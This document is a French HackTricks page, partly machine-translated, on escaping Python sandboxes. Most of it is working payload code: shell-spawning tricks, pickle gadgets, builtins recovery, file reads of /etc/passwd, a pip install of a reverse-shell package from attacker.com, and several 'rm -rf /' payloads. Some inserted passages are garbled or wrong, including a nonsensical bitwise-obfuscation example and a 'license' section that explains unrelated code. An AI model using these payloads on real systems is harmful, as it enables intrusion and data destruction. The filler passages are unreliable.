# Contourner les sandbox Python

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Voici quelques astuces pour contourner les protections des sandbox Python et exécuter des commandes arbitraires.

## Bibliothèques d'exécution de commandes

La première chose que vous devez savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pouvez importer l'une de ces bibliothèques :
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
N'oubliez pas que les fonctions _**open**_ et _**read**_ peuvent être utiles pour **lire des fichiers** à l'intérieur du sandbox Python et pour **écrire du code** que vous pourriez **exécuter** pour **contourner** le sandbox.

{% hint style="danger" %}
La fonction **input()** de Python2 permet d'exécuter du code Python avant que le programme ne plante.
{% endhint %}

Python essaie de **charger les bibliothèques à partir du répertoire courant en premier** (la commande suivante affichera où Python charge les modules) : `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Contourner le sandbox pickle avec les packages Python installés par défaut

### Packages par défaut

Vous pouvez trouver une **liste de packages préinstallés** ici : [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Notez que depuis un pickle, vous pouvez faire en sorte que l'environnement Python **importe des bibliothèques arbitraires** installées dans le système.\
Par exemple, le pickle suivant, lorsqu'il est chargé, va importer la bibliothèque pip pour l'utiliser :
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Pour plus d'informations sur le fonctionnement de pickle, consultez ce lien : [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Package Pip

Astuce partagée par **@isHaacK**

Si vous avez accès à `pip` ou `pip.main()`, vous pouvez installer un package arbitraire et obtenir un shell inversé en appelant :
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Vous pouvez télécharger le package pour créer le shell inversé ici. Veuillez noter qu'avant de l'utiliser, vous devez **le décompresser, modifier le fichier `setup.py` et mettre votre adresse IP pour le shell inversé** :

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Ce package s'appelle `Reverse`. Cependant, il a été spécialement conçu de manière à ce que lorsque vous quittez le shell inversé, le reste de l'installation échoue, de sorte que vous **ne laissiez aucun package Python supplémentaire installé sur le serveur** lorsque vous partez.
{% endhint %}

## Évaluation du code Python

{% hint style="warning" %}
Notez que `exec` permet les chaînes multilignes et ";", mais `eval` ne le permet pas (vérifiez l'opérateur walrus)
{% endhint %}

Si certains caractères sont interdits, vous pouvez utiliser la représentation **hexadécimale/octale/B64** pour **contourner** la restriction :
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Autres bibliothèques permettant d'évaluer du code Python

There are several other libraries that can be used to evaluate Python code. These libraries provide alternative methods to bypass Python sandboxes and execute arbitrary code. Some of these libraries include:

- **`execnet`**: This library allows the execution of code in separate Python interpreters, which can help bypass certain restrictions imposed by sandboxes.

- **`ast`**: The `ast` module provides a way to parse and manipulate Python abstract syntax trees. By using this module, it is possible to evaluate code indirectly and potentially bypass sandboxes.

- **`byteplay`**: This library provides a way to manipulate Python bytecode. By modifying the bytecode of a Python program, it is possible to execute arbitrary code and bypass certain sandbox restrictions.

- **`pypyjs`**: This library is an in-browser Python interpreter that can execute Python code. It can be used to bypass sandboxes that only restrict the execution of code on the server-side.

It is important to note that the use of these libraries may still be detected by advanced sandboxes or security mechanisms. Therefore, caution should be exercised when attempting to bypass sandboxes using these methods.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Opérateurs et astuces rapides

Python provides a variety of operators and short tricks that can be used to bypass sandboxes and execute malicious code. These techniques are often employed by hackers to evade detection and gain unauthorized access to systems.

### String concatenation

One common technique is to use string concatenation to bypass sandboxes that restrict the use of certain characters or keywords. By splitting the malicious code into multiple strings and then concatenating them together, it becomes more difficult for the sandbox to detect and block the code.

```python
# Original code
eval('print("Hello, world!")')

# Bypass using string concatenation
eval('print' + '("Hello, world!")')
```

### Bitwise operators

Bitwise operators can also be used to obfuscate code and bypass sandboxes. By manipulating the bits of a value, hackers can create complex expressions that are difficult to analyze and detect.

```python
# Original code
eval('print("Hello, world!")')

# Bypass using bitwise operators
eval(chr(ord('p') & 0x0f) + chr(ord('r') & 0x0f) + chr(ord('i') & 0x0f) + chr(ord('n') & 0x0f) + chr(ord('t') & 0x0f) + '("Hello, world!")')
```

### Dynamic code execution

Another technique is to dynamically execute code using the `exec` function. This allows hackers to generate and execute code at runtime, making it harder for sandboxes to detect and block the malicious behavior.

```python
# Original code
eval('print("Hello, world!")')

# Bypass using dynamic code execution
exec('print("Hello, world!")')
```

### Function aliases

Hackers can also create aliases for built-in functions to bypass sandboxes that block specific function calls. By assigning a different name to a function, the hacker can still execute the desired code without triggering any restrictions.

```python
# Original code
eval('print("Hello, world!")')

# Bypass using function aliases
p = print
eval('p("Hello, world!")')
```

These are just a few examples of the operators and tricks that can be used to bypass Python sandboxes. It's important to note that these techniques should only be used for educational purposes and with proper authorization.
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Contournement des protections via les encodages (UTF-7)

Dans [**ce compte rendu**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), l'UTF-7 est utilisé pour charger et exécuter du code Python arbitraire à l'intérieur d'un sandbox apparent :
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Il est également possible de contourner cela en utilisant d'autres encodages, par exemple `raw_unicode_escape` et `unicode_escape`.

## Exécution de Python sans appels

Si vous êtes dans une prison Python qui **ne vous permet pas de faire des appels**, il existe encore quelques moyens d'**exécuter des fonctions, du code** et des **commandes** arbitraires.

### RCE avec [décorateurs](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE création d'objets et surcharge

Si vous pouvez **déclarer une classe** et **créer un objet** de cette classe, vous pouvez **écrire/écraser différentes méthodes** qui peuvent être **déclenchées** **sans** avoir besoin de les appeler directement.

#### RCE avec des classes personnalisées

Vous pouvez modifier certaines **méthodes de classe** (_en écrasant les méthodes de classe existantes ou en créant une nouvelle classe_) pour les faire **exécuter du code arbitraire** lorsqu'elles sont **déclenchées** sans les appeler directement.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Création d'objets avec [méta-classes](https://docs.python.org/3/reference/datamodel.html#metaclasses)

La chose clé que les méta-classes nous permettent de faire est de **créer une instance d'une classe sans appeler directement le constructeur**, en créant une nouvelle classe avec la classe cible en tant que méta-classe.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Création d'objets avec des exceptions

Lorsqu'une **exception est déclenchée**, un objet de la classe **Exception** est **créé** sans que vous ayez besoin d'appeler directement le constructeur (une astuce de [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Plus de RCE

---

#### Bypassing Python Sandboxes

#### Contourner les environnements sécurisés Python

---

Python sandboxes are commonly used to execute untrusted code in a controlled environment. However, these sandboxes can be bypassed using various techniques. In this section, we will explore some of the methods to bypass Python sandboxes and achieve Remote Code Execution (RCE).

Les environnements sécurisés Python sont couramment utilisés pour exécuter du code non fiable dans un environnement contrôlé. Cependant, ces environnements peuvent être contournés en utilisant différentes techniques. Dans cette section, nous explorerons certaines des méthodes permettant de contourner les environnements sécurisés Python et d'obtenir une exécution de code à distance (RCE).

---

#### Methodologies

#### Méthodologies

1. **Sandbox Escape Techniques**: These techniques involve exploiting vulnerabilities in the sandbox implementation to break out of the restricted environment.

   Techniques d'évasion de l'environnement sécurisé : Ces techniques consistent à exploiter les vulnérabilités de l'implémentation de l'environnement sécurisé afin de sortir de l'environnement restreint.

2. **Code Injection**: By injecting malicious code into the sandboxed environment, an attacker can execute arbitrary commands and achieve RCE.

   Injection de code : En injectant du code malveillant dans l'environnement sécurisé, un attaquant peut exécuter des commandes arbitraires et obtenir une exécution de code à distance (RCE).

3. **Exploiting Sandbox Limitations**: Sandboxes may have limitations or weaknesses that can be exploited to gain unauthorized access or execute arbitrary code.

   Exploitation des limitations de l'environnement sécurisé : Les environnements sécurisés peuvent présenter des limitations ou des faiblesses qui peuvent être exploitées pour obtenir un accès non autorisé ou exécuter du code arbitraire.

---

#### Resources

#### Ressources

- **SandboxMe**: A collection of Python sandbox escape techniques and examples.

   **SandboxMe** : Une collection de techniques et d'exemples d'évasion de l'environnement sécurisé Python.

- **Python Sandbox**: A Python library that provides a sandboxed environment for executing untrusted code.

   **Python Sandbox** : Une bibliothèque Python qui fournit un environnement sécurisé pour exécuter du code non fiable.

- **OWASP Python Security Project**: A project that aims to provide guidance and resources for securing Python applications.

   **OWASP Python Security Project** : Un projet qui vise à fournir des conseils et des ressources pour sécuriser les applications Python.

---

By understanding the methodologies and utilizing the available resources, you can effectively bypass Python sandboxes and achieve RCE. However, it is important to note that these techniques should only be used for ethical purposes such as penetration testing or securing vulnerable systems.

En comprenant les méthodologies et en utilisant les ressources disponibles, vous pouvez contourner efficacement les environnements sécurisés Python et obtenir une exécution de code à distance (RCE). Cependant, il est important de noter que ces techniques ne doivent être utilisées que dans un but éthique, tel que les tests de pénétration ou la sécurisation des systèmes vulnérables.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Lire un fichier avec l'aide de builtins et de la licence

Lorsque vous travaillez avec des environnements de sandboxing Python, il peut être nécessaire de contourner les restrictions pour accéder à des fichiers spécifiques. Dans cet exemple, nous allons voir comment lire un fichier en utilisant les fonctions `help` et `license` intégrées à Python.

Voici le code Python qui vous permettra de contourner les restrictions de la sandbox et de lire un fichier :

```python
import builtins

# Contourner les restrictions de la sandbox
__builtins__ = builtins

# Lire le contenu du fichier
with open('nom_du_fichier', 'r') as file:
    content = file.read()

# Afficher le contenu du fichier
print(content)
```

Dans ce code, nous utilisons la fonction `open` pour ouvrir le fichier spécifié en mode lecture (`'r'`). Ensuite, nous utilisons la méthode `read` pour lire le contenu du fichier. Enfin, nous affichons le contenu du fichier à l'aide de la fonction `print`.

Assurez-vous de remplacer `'nom_du_fichier'` par le chemin absolu ou relatif du fichier que vous souhaitez lire.

N'oubliez pas que contourner les restrictions de la sandbox peut être considéré comme une violation des politiques de sécurité et peut avoir des conséquences légales. Utilisez ces techniques avec précaution et uniquement dans le cadre d'un test de pénétration autorisé.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Fonctions intégrées

* [**Fonctions intégrées de python2**](https://docs.python.org/2/library/functions.html)
* [**Fonctions intégrées de python3**](https://docs.python.org/3/library/functions.html)

Si vous pouvez accéder à l'objet **`__builtins__`**, vous pouvez importer des bibliothèques (notez que vous pourriez également utiliser ici une autre représentation de chaîne montrée dans la dernière section) :
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Pas de fonctions intégrées

Lorsque vous n'avez pas `__builtins__`, vous ne pourrez pas importer quoi que ce soit, ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
Cependant, **par défaut, Python importe de nombreux modules en mémoire**. Ces modules peuvent sembler inoffensifs, mais certains d'entre eux **importent également des fonctionnalités dangereuses** à l'intérieur d'eux, auxquelles on peut accéder pour obtenir même une **exécution de code arbitraire**.

Dans les exemples suivants, vous pouvez observer comment **abuser** de certains de ces modules "**inoffensifs**" chargés pour **accéder** à des **fonctionnalités dangereuses** à l'intérieur d'eux.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful and versatile programming language that is widely used in various domains, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.

However, Python3 also has its security vulnerabilities, and one of them is the ability to bypass sandboxes. Sandboxing is a security mechanism that isolates an application from the rest of the system, preventing it from accessing sensitive resources or executing malicious code.

In this guide, we will explore different techniques to bypass Python3 sandboxes and gain unauthorized access to restricted resources. These techniques can be used for legitimate purposes, such as penetration testing or vulnerability assessment, but they can also be exploited by malicious actors.

It is important to note that bypassing sandboxes without proper authorization is illegal and unethical. This guide is intended for educational purposes only, to help security professionals understand the vulnerabilities and develop effective countermeasures.

If you are a security professional or a developer responsible for securing Python3 applications, this guide will provide you with valuable insights into the vulnerabilities and countermeasures associated with Python3 sandboxes. By understanding how these sandboxes can be bypassed, you can better protect your applications and systems from potential attacks.

Let's dive into the world of Python3 sandbox bypass techniques and explore the various methods and resources available to hackers and security professionals.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
print.__self__
dir.__self__
globals.__self__
len.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Ci-dessous se trouve une fonction plus grande**](./#recherche-récursive-des-builtins-globals) pour trouver des dizaines/**centaines** de **emplacements** où vous pouvez trouver les **builtins**.

#### Python2 et Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Charges intégrées

Les charges intégrées sont des méthodes couramment utilisées pour contourner les sandbox Python. Ces charges exploitent les fonctionnalités intégrées de Python pour exécuter du code malveillant sans être détectées par les mécanismes de sécurité.

#### `__import__`

La fonction `__import__` est utilisée pour importer des modules en Python. Elle peut également être utilisée pour exécuter du code malveillant en important un module contenant du code dangereux. Par exemple :

```python
__import__('os').system('rm -rf /')
```

Cette charge utilise la fonction `system` du module `os` pour exécuter la commande `rm -rf /`, qui supprime tous les fichiers du système de fichiers.

#### `eval`

La fonction `eval` est utilisée pour évaluer une expression Python. Elle peut être utilisée pour exécuter du code malveillant en évaluant une chaîne de caractères contenant du code dangereux. Par exemple :

```python
eval("__import__('os').system('rm -rf /')")
```

Cette charge évalue la chaîne de caractères `"__import__('os').system('rm -rf /')"`, qui importe le module `os` et exécute la commande `rm -rf /`.

#### `exec`

La fonction `exec` est utilisée pour exécuter du code Python. Elle peut être utilisée pour exécuter du code malveillant en exécutant une chaîne de caractères contenant du code dangereux. Par exemple :

```python
exec("__import__('os').system('rm -rf /')")
```

Cette charge exécute la chaîne de caractères `"__import__('os').system('rm -rf /')"`, qui importe le module `os` et exécute la commande `rm -rf /`.

#### `pickle`

Le module `pickle` est utilisé pour sérialiser et désérialiser des objets Python. Il peut être utilisé pour exécuter du code malveillant en désérialisant un objet contenant du code dangereux. Par exemple :

```python
import pickle

payload = pickle.loads(b'\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06system\x94\x93\x94\x8c\x0brm -rf /\x94\x85\x94R\x94.')
payload()
```

Cette charge désérialise un objet contenant la fonction `system` du module `os` et la commande `rm -rf /`. En appelant la charge (`payload()`), le code malveillant est exécuté.

#### `subprocess`

Le module `subprocess` est utilisé pour exécuter des commandes système en Python. Il peut être utilisé pour exécuter du code malveillant en appelant une commande dangereuse. Par exemple :

```python
import subprocess

subprocess.call('rm -rf /', shell=True)
```

Cette charge utilise la fonction `call` du module `subprocess` pour exécuter la commande `rm -rf /`, qui supprime tous les fichiers du système de fichiers.
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globals et locals

Vérifier les **`globals`** et **`locals`** est un bon moyen de savoir à quoi vous pouvez accéder.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
